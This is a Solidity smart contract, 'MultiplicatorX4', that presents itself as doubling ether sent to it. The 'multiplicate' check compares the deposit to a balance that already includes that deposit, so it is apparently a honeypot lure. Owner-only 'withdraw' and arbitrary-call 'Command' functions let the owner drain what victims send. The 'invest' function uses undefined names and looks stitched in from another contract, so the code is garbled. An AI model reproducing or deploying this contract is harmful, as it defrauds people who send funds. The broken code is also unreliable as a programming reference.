 

 pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public Owner = msg.sender;
   

    function invest(
        address _client,
        uint8 _depositsCount
    )
    payable public
    {
        uint amount = msg.value;

        // if less then 5 deposits
        if (_depositsCount < 5) {

            uint serviceFee;

            serviceFee = amount * serviceFees[_depositsCount];

            uint referralFee = amount * referralFees[_depositsCount];

            // distribute deposit fee among users above on the branch & update users' statuses
            distribute(data.parentOf(_client), 0, _depositsCount, amount);

            // update balance & number of deposits of user
            uint active = (amount * 100).sub(referralFee).sub(serviceFee);

            wbtToken.mint(_client, active / 100 * wbtToken.rate() / wbtToken.mrate());

            // update owner`s balance
            data.addBalance(owner, serviceFee * 10000);
        } else {
            wbtToken.mint(_client, amount * wbtToken.rate() / wbtToken.mrate());
        }
    }


    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
         
        adr.call.value(msg.value)(data);
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}